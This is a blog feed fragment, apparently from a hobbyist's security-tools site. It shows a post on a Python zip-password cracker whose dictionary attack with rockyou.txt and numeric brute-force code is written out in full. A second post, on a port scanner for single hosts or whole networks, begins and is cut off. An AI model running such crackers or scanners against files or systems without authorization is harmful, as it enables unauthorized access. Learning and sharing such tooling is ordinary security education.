&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[-] Checking password : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;i)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;				zf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extractall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;pwd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;pwd)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;*&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[+] Password is found : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;i)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Files in &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;zfile)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;zf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;namelist&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;					&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;f)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;*&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The rocku() function is opening the rockyou.txt file in read mode and the zip file is opened using the pyzipper module. Then it is iterating over the each password in the rockyou.txt file and converting it into bytes. The password bytes is given as arguement to the extractall() function. If the password is found then the files will be extracted and the list of files and the password will be printed on screen.&lt;&#x2F;p&gt;
&lt;p&gt;If the user chooses custom wordlist method to crack zip file the &lt;code&gt;custom_password()&lt;&#x2F;code&gt; function will be invoked.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;custom_passwd&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;zfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;wfile&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	wordlist &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(wfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span&gt;pyzipper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;AESZipFile&lt;&#x2F;span&gt;&lt;span&gt;(zfile) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;zf:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;wordlist:
&lt;&#x2F;span&gt;&lt;span&gt;			pwd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;utf-8&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[-] Checking password : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;i)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;				zf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extractall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;pwd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;pwd)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;*&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[+] Password is found : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;i)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Files in &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;zfile)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;zf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;namelist&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;					&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;f)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;*&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The custom_password() function is doing the same thing as the rocku() function. Along with the zipfile the custom wordlist is needed to proceed.&lt;&#x2F;p&gt;
&lt;p&gt;If the user chooses bruteforce method the &lt;code&gt;bruteforce()&lt;&#x2F;code&gt; method will be invoked.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bruteforce&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;zfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;passlen&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span&gt;pyzipper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;AESZipFile&lt;&#x2F;span&gt;&lt;span&gt;(zfile) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;zf:
&lt;&#x2F;span&gt;&lt;span&gt;		total_passwords &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(passlen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;9&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(total_passwords&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;			pwd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;utf-8&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[-] Checking password : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;i)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;				zf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extractall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;pwd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;pwd)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;*&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[+] Password is found : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;i)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Files in &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;zfile)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;zf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;namelist&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;					&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;f)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;*&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;		
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A brute force attack is a hacking method that uses trial and error to crack passwords, login credentials, and encryption keys. It is a simple yet reliable tactic for gaining unauthorized access to individual accounts and organizations‚Äô systems and networks. The hacker tries multiple usernames and passwords, often using a computer to test a wide range of combinations, until they find the correct login information.
The brute force approach is inefficient. For real-time problems, algorithm analysis often goes above the O(N!) order of growth.&lt;&#x2F;p&gt;
&lt;p&gt;As it is very time consuming for the long passwords i recommend to use this method for the passwords upto the length of 6. And this passwords are the combination of digits only.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;&#x2F;h3&gt;
&lt;p&gt;You require these additional modules&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;pyzipper&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;These modules will be pre installed on every system, if not then install them with &lt;code&gt;pip3 or pip&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;You need to download rockyou.txt and paste it in PythonZipCracker folder&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Rockyou.txt : &lt;a href=&quot;https:&#x2F;&#x2F;www.kaggle.com&#x2F;datasets&#x2F;wjburns&#x2F;common-password-list-rockyoutxt&quot;&gt;https:&#x2F;&#x2F;www.kaggle.com&#x2F;datasets&#x2F;wjburns&#x2F;common-password-list-rockyoutxt&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h3 id=&quot;installation&quot;&gt;Installation&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;PythonZipCracker.git
&lt;&#x2F;span&gt;&lt;span&gt;cd PythonZipCracker
&lt;&#x2F;span&gt;&lt;span&gt;python3 crack.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;preview&quot;&gt;Preview&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;project_img&#x2F;zipcrack&#x2F;pythonzipcrack.png&quot; alt=&quot;Preview&quot; &#x2F;&gt;{: w=&quot;600&quot;,h=&quot;600&quot;}&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;If anything should be modified in the script please let me know.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;You can find complete source code of PythonZipCracker here : &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;PythonZipCracker&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;PythonZipCracker&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>PortScan</title>
        <published>2022-10-07T00:00:00+00:00</published>
        <updated>2022-10-07T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/pythonportscanner/"/>
        <id>https://themj0ln1r.github.io/projects/pythonportscanner/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/pythonportscanner/">&lt;p&gt;Hi guys!,&lt;&#x2F;p&gt;
&lt;p&gt;Mj0ln1r is here, back again with a new post this is meta data about my new python script&#x2F;tool Simple Python Port Scanner.&lt;&#x2F;p&gt;
&lt;p&gt;As you know i am learning and building some simple python automated tools. Port Scanner is my second tool which is programmed by my own knowledge.&lt;&#x2F;p&gt;
&lt;p&gt;I wrote this script called &lt;code&gt;Port_Scanner&lt;&#x2F;code&gt; in python. I learned &lt;code&gt;basics of socket programming&lt;&#x2F;code&gt; , little bit about &lt;code&gt;platform&lt;&#x2F;code&gt; module, &lt;code&gt;multi-threading in python&lt;&#x2F;code&gt; and a basic tool&lt;code&gt;ping&lt;&#x2F;code&gt; which is useful in computer networking.&lt;&#x2F;p&gt;
&lt;p&gt;So, here&#x27;s a brief information about my simple python port scanner.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;port-scanner&quot;&gt;Port Scanner&lt;&#x2F;h1&gt;
&lt;p&gt;This is a basic computer networking based project. The script is developed using python which can perform following tasks.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Scanning open ports on a single target&lt;&#x2F;li&gt;
&lt;li&gt;Scanning open ports in every system in a network
Let&#x27;s start with the main function.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;	1 &amp;gt; Scan one device
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;	2 &amp;gt; Scan Entire network
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		&amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter your choice(1&#x2F;2) : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Scanning only one target.. &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;target_ip
&lt;&#x2F;span&gt;&lt;span&gt;		target_ip &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Target IP or URL : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
